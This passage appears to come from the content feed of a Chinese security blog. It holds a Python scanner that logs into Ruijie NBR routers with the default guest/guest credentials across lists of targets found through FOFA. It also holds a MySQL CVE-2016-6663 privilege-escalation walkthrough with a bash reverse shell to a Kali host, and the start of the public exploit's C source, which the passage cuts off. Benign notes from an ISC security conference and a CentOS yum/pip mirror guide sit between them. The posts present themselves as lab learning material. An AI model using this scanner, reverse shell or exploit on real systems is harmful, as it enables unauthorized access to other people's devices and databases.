class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(url2+<span class="string">&#x27;存在弱口令&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(url2+<span class="string">&#x27;不存在弱口令&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(url2+<span class="string">&#x27;不存在弱口令&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>锐捷NBR路由器存在弱口令漏洞</title>
+    <url>/2021/11/01/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>锐捷网络股份有限公司NBR路由器存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>NBR路由器</p>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;NBR路由器&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>无</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>百度上查询到NBR路由器的默认账号密码为guest/guest；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101195444160.png" alt="image-20211101195444160"></p>
+<p>在NBR后台管理界面使用默认账号密码成功登录后台；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101195603393.png" alt="image-20211101195603393"></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning  <span class="comment">#消除警告</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  <span class="comment"># 消除警告</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longer</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;FOFA:title=&quot;锐捷网络--NBR路由器--登录界面&quot;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;python xxx.py -u/--url http://xxx.xxx.xxx.xxx&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;python xxx.py -f/--file xxx.txt&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;longer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    longer()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">par = argparse.ArgumentParser(description=<span class="string">&#x27;longer help&#x27;</span>)</span><br><span class="line"></span><br><span class="line">par.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span> ,<span class="built_in">help</span>=<span class="string">&#x27;输入url&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">par.add_argument(<span class="string">&#x27;-f&#x27;</span>,<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;输入文件&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">a = par.parse_args()</span><br><span class="line"></span><br><span class="line">url =a.url</span><br><span class="line">file =a.file</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/plain;charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;c_name=; hardtype=NBR2000G; web-coding=gb2312; currentURL=; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic Z3Vlc3Q6Z3Vlc3Q=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;command=show clock&amp;strurl=exec%04&amp;mode=%02PRIV_EXEC&amp;signname=Red-Giant.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> url != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    url = url</span><br><span class="line">    url2 =url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url1 =url+<span class="string">&#x27;/WEB_VMS/LEVEL15/&#x27;</span></span><br><span class="line">        r =requests.post(url=url1 , data=data,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;WebCLI&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(url2+<span class="string">&#x27;NBR路由器存在弱口令：guest/guest&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(url2+<span class="string">&#x27;NBR路由器不存在弱口令&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(url2+<span class="string">&#x27;异常&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    p = <span class="built_in">open</span>(file,<span class="string">&#x27;r+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p.readlines():</span><br><span class="line">        url = i.strip()</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>) != <span class="number">1</span> <span class="keyword">and</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>) != <span class="number">1</span>:</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span>+url</span><br><span class="line">        url=url</span><br><span class="line">        url1=url</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = url +<span class="string">&#x27;/WEB_VMS/LEVEL15/&#x27;</span></span><br><span class="line">            r=requests.post(url=url,headers=headers,data=data,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;WebCLI&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(url1+<span class="string">&#x27;NBR路由器存在弱口令：guest/guest&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(url1+<span class="string">&#x27;NBR路由器不存在弱口令&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(url1+<span class="string">&#x27;异常&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>北京ISC网络安全大会</title>
+    <url>/2021/10/30/%E5%8C%97%E4%BA%ACISC%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/</url>
+    <content><![CDATA[<hr>
+<p>北京，</p>
+<p>是一座你来了便不会忘记的城市。</p>
+<p>这座昔日的古都，</p>
+<p>如今又成为人们所关注和向往的地方。</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="云安全联盟CISO高峰论坛"><a href="#云安全联盟CISO高峰论坛" class="headerlink" title="云安全联盟CISO高峰论坛"></a>云安全联盟CISO高峰论坛</h2><h3 id="数字化转型"><a href="#数字化转型" class="headerlink" title="数字化转型"></a>数字化转型</h3><p>数字化转型是一个产业，是指经营的数字经济时代，在领域内的价值创造（用户体验、业务增长、商业模式等），也就是新一代的网络化、数字化、智能化技术。</p>
+<p>分词理解：数字化=手段；转=战术（方法）+实践；转型=目标。</p>
+<p>个人见解：数字化转型产业已然来临，如银行。虚拟世界(计算机)与生物世界（人、动物）相结合的时代，做好数字化安全是很有必要的，方向可以是增强甲方业务主机保护能力（防御提升、支持热响应，即发现攻击后不仅只是检测，还能直接阻断或是修复，做到这样的技术类似是“火眼”的EDR“回滚”操作，类似快照还原的功能）、增强用户体验等。</p>
+<h3 id="一横三纵方针"><a href="#一横三纵方针" class="headerlink" title="一横三纵方针"></a>一横三纵方针</h3><p>以业务为主线，牢牢把握“科技·安全·生态”三大核心立足点。</p>
+<p>业务&gt;科技&gt;安全。</p>
+<h3 id="数智化安全能力框架"><a href="#数智化安全能力框架" class="headerlink" title="数智化安全能力框架"></a>数智化安全能力框架</h3><p>（城市比作业务，把操作业务运行的人【老板】比作市长）。</p>
+<p><strong>数字化业务安全</strong>：线上交易安全、隐私保护、反欺诈、内容安全、智慧城市安全……；</p>
+<p><strong>数字化科技安全</strong>：大数据安全、AI安全、物联网安全（万物皆可互联）、区块链安全、工业互联网安全……；</p>
+<p><strong>数字化基础设施安全</strong>：云原生安全、零信任、主机安全、应用安全……。</p>
+<h3 id="SASE"><a href="#SASE" class="headerlink" title="SASE"></a>SASE</h3><ol>
+<li>利用CDN/VPN等产品提供部分云化安全能力（如抗D）；</li>
+<li>传统安全厂商，提供订阅服务；</li>
+<li>基于零信任产品改造。</li>
+</ol>
+<h3 id="数字化安全体系建设实践"><a href="#数字化安全体系建设实践" class="headerlink" title="数字化安全体系建设实践"></a>数字化安全体系建设实践</h3><p>安全意识、零信任——安全实践、安全工具与方法——安全过程自动化、安全流程IT化、安全团队建设、安全知识库建设——应急响应、循环改造</p>
+<h3 id="数字化安全未来方向"><a href="#数字化安全未来方向" class="headerlink" title="数字化安全未来方向"></a>数字化安全未来方向</h3><p>客户信任、零信任架构、自动化安全、数字化可信。</p>
+<h3 id="基于云化的数据安全解决方案思路"><a href="#基于云化的数据安全解决方案思路" class="headerlink" title="基于云化的数据安全解决方案思路"></a>基于云化的数据安全解决方案思路</h3><p><strong>综合治理平台</strong>：策略采集——策略处置——策略联动——策略下发；</p>
+<p><strong>统一策略平台</strong>：数据库审计——资产梳理——终端防泄露——数据库防火墙/加密——堡垒机——统一身份管理。</p>
+<h2 id="信创安全技术与应用"><a href="#信创安全技术与应用" class="headerlink" title="信创安全技术与应用"></a>信创安全技术与应用</h2><h3 id="安全运营体系"><a href="#安全运营体系" class="headerlink" title="安全运营体系"></a>安全运营体系</h3><p>资产清单——资产监控——资产判定——资产处置——安全恢复——处置报告。安全检测：</p>
+<p>漏扫工具——渗透测试——代码审计——安全测试——互联网监控。</p>
+<p><strong>底层采集：</strong>安全工具、系统日志、网络日志、应用日志。</p>
+<p><strong>三道防线：</strong>安全测试全覆盖、强化渗透测试、全天候SRC众测。</p>
+<h2 id="云安全联盟CISO高峰论坛-1"><a href="#云安全联盟CISO高峰论坛-1" class="headerlink" title="云安全联盟CISO高峰论坛"></a>云安全联盟CISO高峰论坛</h2><h3 id="网络安全运营实践"><a href="#网络安全运营实践" class="headerlink" title="网络安全运营实践"></a>网络安全运营实践</h3><p>综合分析研判、主动防御、监控发现、基础安全支持。</p>
+<p>SDL管控服务平台：安全左移、适配DevSecOps(集成工具、提供自动审计功能)，安全Wiki建设、数据采集能力、数据分析能力。</p>
+<h3 id="情报能力建设"><a href="#情报能力建设" class="headerlink" title="情报能力建设"></a>情报能力建设</h3><p>威胁发现——攻击意图挖掘——设备赋能；</p>
+<p>情报聚合、情报分发、展示——沙箱集群、知识推理、分类、蜜罐日志、情报线索、告警日志。</p>
+<h3 id="应急处置能力"><a href="#应急处置能力" class="headerlink" title="应急处置能力"></a>应急处置能力</h3><p>安全编排与自动化响应平台。</p>
+<p>案件管理——安全编排与自动化——告警管理=综合分析平台——CMDB——UEBA</p>
+<h3 id="网络安全态势检测"><a href="#网络安全态势检测" class="headerlink" title="网络安全态势检测"></a>网络安全态势检测</h3><p>活跃设备检测——扫描探测活跃检测——恶意攻击代码检测——重点业务安全态势检测——事件检测。</p>
+<h3 id="关联分析"><a href="#关联分析" class="headerlink" title="关联分析"></a>关联分析</h3><p>三个关键词：机器学习功能算法、业务数据、威胁事件。</p>
+<h2 id="CSO高峰论坛"><a href="#CSO高峰论坛" class="headerlink" title="CSO高峰论坛"></a>CSO高峰论坛</h2><h3 id="安全态势全景，挑战持续变化。"><a href="#安全态势全景，挑战持续变化。" class="headerlink" title="安全态势全景，挑战持续变化。"></a>安全态势全景，挑战持续变化。</h3><p>攻击团队持续专业化、攻击手段持续更新、数据安全风险持续、损失持续扩大。</p>
+<p>篡改、仿冒、诈骗持续增长，成为热点标题。</p>
+<p>可持续网络安全运营的团队组织，服务团队、运营团队、技术支撑团队。</p>
+<h3 id="云原生安全"><a href="#云原生安全" class="headerlink" title="云原生安全"></a>云原生安全</h3><p>传统的攻击方式对容器同样有效，内核漏洞逃逸等、配置安全、计算、网络运行环境安全、CI/CD安全、镜像安全等。</p>
+<p>解决方案：平行容器+主机agent，镜像安全扫描+镜像运行时阻断。</p>
+<h3 id="特权账号管理"><a href="#特权账号管理" class="headerlink" title="特权账号管理"></a>特权账号管理</h3><p>思路：识别（资产、账户收集）——防御（身份认证、访问控制）——检测（弱口令检测）——响应——恢复（账号台账、物理设备恢复）。</p>
+<h2 id="ATT-amp-CK安全能力衡量论坛"><a href="#ATT-amp-CK安全能力衡量论坛" class="headerlink" title="ATT&amp;CK安全能力衡量论坛"></a>ATT&amp;CK安全能力衡量论坛</h2><h3 id="实战驱动的网络安全方法论。"><a href="#实战驱动的网络安全方法论。" class="headerlink" title="实战驱动的网络安全方法论。"></a>实战驱动的网络安全方法论。</h3><p><strong>攻击者视角全景框架</strong>：网络杀伤力框架（洛克希德-马丁）、入侵者技术战术知识框架（MITRE）、公共网络威胁框架(美国国家情报)、技术性网络威胁框架（美国国家安全局）;<br><strong>防御者视角全景框架</strong>：网络安全框架（NIST）、主动防御框架（MITRE）、社区防御模型（CIS）、网络安全对策知识图谱。能力视角成熟度：网络安全成熟度模型认证，CMMC（美国国防部）、CMM2（美国能源部）。<br><strong>确保三个元素的关联性</strong>：攻击框架（CTF/TCTF/ATT&amp;CK）——防御框架（NIST CSF/SHIELD/MITRE/D3FEND）——成熟度模型（CMMC、CMM2）。</p>
+<p>360全景攻防知识图谱：兼容ATT&amp;CK模型（杀伤链攻击全景）——攻击战术、攻击实体元素、关系模型、攻击检测规则、APT组织——应急预案（漏洞和受影响的资产）。<br>360网络安全防御框架：进攻反制——情报运营——主动防御（框架覆盖，shield、d3fend）——被动防御。<br>360成熟度模型：获得能力——积攒能力——提升能力——输出能力。<br>个人见解：继续深、广化ATT&amp;CK防御能力，研究shield、d3fend框架，构建知识库。</p>
+]]></content>
+      <categories>
+        <category>网络安全大会</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CentOS更换yum源和pip源</title>
+    <url>/2021/11/05/CentOS%E6%9B%B4%E6%8D%A2yum%E6%BA%90%E5%92%8Cpip%E6%BA%90/</url>
+    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
+<p>CentOS，是基于 Red Hat Linux 提供的可自由使用源代码的企业级 Linux 发行版本；是一个稳定，可预测，可管理和可复制的免费企业级计算平台。</p>
+<ul>
+<li>参考：<a href="https://www.hackliu.com/?p=603">https://www.hackliu.com/?p=603</a></li>
+</ul>
+<hr>
+<span id="more"></span>
+
+<h2 id="更换yum源"><a href="#更换yum源" class="headerlink" title="更换yum源"></a>更换yum源</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>
+
+<h3 id="CentOS-6"><a href="#CentOS-6" class="headerlink" title="CentOS 6"></a>CentOS 6</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br></pre></td></tr></table></figure>
+
+<h3 id="CentOS-7"><a href="#CentOS-7" class="headerlink" title="CentOS 7"></a>CentOS 7</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure>
+
+<h3 id="CentOS-8"><a href="#CentOS-8" class="headerlink" title="CentOS 8"></a>CentOS 8</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br></pre></td></tr></table></figure>
+
+<h3 id="缓存-amp-更新"><a href="#缓存-amp-更新" class="headerlink" title="缓存&amp;更新"></a>缓存&amp;更新</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br><span class="line">yum update</span><br></pre></td></tr></table></figure>
+
+<h2 id="更换pip源"><a href="#更换pip源" class="headerlink" title="更换pip源"></a>更换pip源</h2><p>临时使用;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install some-package -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
+
+<p>设为默认;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pip -U</span><br><span class="line">pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
+
+<p>pip源；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 豆瓣</span><br><span class="line">https://pypi.doubanio.com/simple/</span><br><span class="line"></span><br><span class="line"># 阿里云    </span><br><span class="line">https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line"># 清华大学</span><br><span class="line">https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>安全运维</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>MySQL漏洞提权(CVE-2016-6663)</title>
+    <url>/2021/11/04/MySQL%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83(CVE-2016-6663)/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>Mysql之前爆出了CVE-2016-6662、CVE-2016-6663、CVE-2016-6664提权漏洞，影响了Mysql小于5.5.51或小于5.6.32或小于5.7.14及衍生版本。然而好多网站都没有升级，利用场景还是很多的，于是实践一下。</p>
+<ul>
+<li>参考：<a href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31">https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31</a></li>
+</ul>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p><strong>MariaDB</strong><br>  &lt; 5.5.52<br>  &lt; 10.1.18<br>  &lt; 10.0.28</p>
+<p><strong>MySQL</strong><br>  &lt;= 5.5.51<br>  &lt;= 5.6.32<br>  &lt;= 5.7.14</p>
+<p>Percona Server<br>  &lt; 5.5.51-38.2<br>  &lt; 5.6.32-78-1<br>  &lt; 5.7.14-8</p>
+<p><strong>Percona XtraDB Cluster</strong><br>  &lt; 5.6.32-25.17<br>  &lt; 5.7.14-26.17<br>  &lt; 5.5.41-37.0</p>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker环境搭建；</p>
+<p><a href="https://www.sqlsec.com/">国光</a>师傅已经将漏洞环境封装到了Docker Hub上；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 拉取镜像</span><br><span class="line">docker pull sqlsec/cve-2016-6663</span><br><span class="line"></span><br><span class="line"># 部署镜像</span><br><span class="line">docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104095443120.png" alt="image-20211104095443120"></p>
+<p>添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -e &quot;create database test;CREATE USER &#x27;test&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;; grant create,drop,insert,select on test.* to &#x27;test&#x27;@&#x27;%&#x27;;flush privileges;&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>利用成功条件</strong></p>
+<ol>
+<li>Getshell 拿到 www-data 权限</li>
+<li>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</li>
+<li>关键提取步骤需要在交互环境下，所以需要反弹 shell</li>
+<li>MySQL 版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</li>
+<li>MariaDB 版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</li>
+</ol>
+<p>php shell 国光师傅已经给出来了访问连接如下：</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104110457435.png" alt="image-20211104110457435"></p>
+<p>通过蚁剑连接shell;</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104110625042.png" alt="image-20211104110625042"></p>
+<p>然后 Bash 反弹 shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali开启nc监听：</span><br><span class="line">nc -lvvp 2333</span><br><span class="line"></span><br><span class="line">在蚁剑终端中执行：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/kali-ip/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104111124636.png" alt="image-20211104111124636"></p>
+<p>在反弹 shell 的情况下，首先将 <a href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">EXP</a>使用蚁剑copy到受害机当中，EXP如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit</span></span><br><span class="line"><span class="comment">mysql-privesc-race.c (ver. 1.0)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CVE-2016-6663 / OCVE-2016-5616</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Discovered/Coded by:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Dawid Golunski</span></span><br><span class="line"><span class="comment">dawid[at]legalhackers.com</span></span><br><span class="line"><span class="comment">https://legalhackers.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Follow https://twitter.com/dawid_golunski for updates on this advisory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Compile:</span></span><br><span class="line"><span class="comment">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Note:</span></span><br><span class="line"><span class="comment">* On RedHat-based systems you might need to change /tmp to another public directory (e.g. /uploads)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* For testing purposes only. Do no harm.  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Full advisory URL:</span></span><br><span class="line"><span class="comment">https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Video PoC:</span></span><br><span class="line"><span class="comment">https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;grp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/inotify.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_PATH          <span class="meta-string">&quot;/tmp/mysql_privesc_exploit&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_DIRN          <span class="meta-string">&quot;mysql_privesc_exploit&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYSQL_TAB_FILE    EXP_PATH <span class="meta-string">&quot;/exploit_table.MYD&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYSQL_TEMP_FILE   EXP_PATH <span class="meta-string">&quot;/exploit_table.TMD&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUID_SHELL   	  EXP_PATH <span class="meta-string">&quot;/mysql_suid_shell.MYD&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_DELAY 1000    <span class="comment">// can be used in the race to adjust the timing if necessary</span></span></span><br><span class="line"></span><br><span class="line">MYSQL *conn;		  <span class="comment">// DB handles</span></span><br><span class="line">MYSQL_RES *res;</span><br><span class="line">MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intro</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>( 